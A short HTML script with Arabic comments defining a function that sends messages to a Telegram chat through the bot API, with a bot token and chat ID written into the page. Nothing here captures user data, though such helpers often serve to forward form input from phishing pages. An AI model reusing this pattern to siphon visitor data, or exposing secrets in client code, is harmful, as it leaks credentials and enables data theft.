<script>
    // البيانات الجديدة المستخرجة من صورك
    const BOT_TOKEN = "8640073881:AAHc6TuNlI7_fhuQ-K6Lbd6sKLgm6y-iZTk"; //
    const CHAT_ID = "8665814266"; //

    function sendToBot(msg) {
        // تأكد من أن جهازك متصل بالإنترنت عند الضغط على الزر
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
        
        fetch(url)
        .then(response => {
            if (!response.ok) {
                console.error("خطأ في الإرسال، تأكد من تشغيل البوت أولاً عبر /start");
            }
        })
        .catch(error => console.error("مشكلة في الاتصال:", error));
    }
</script>
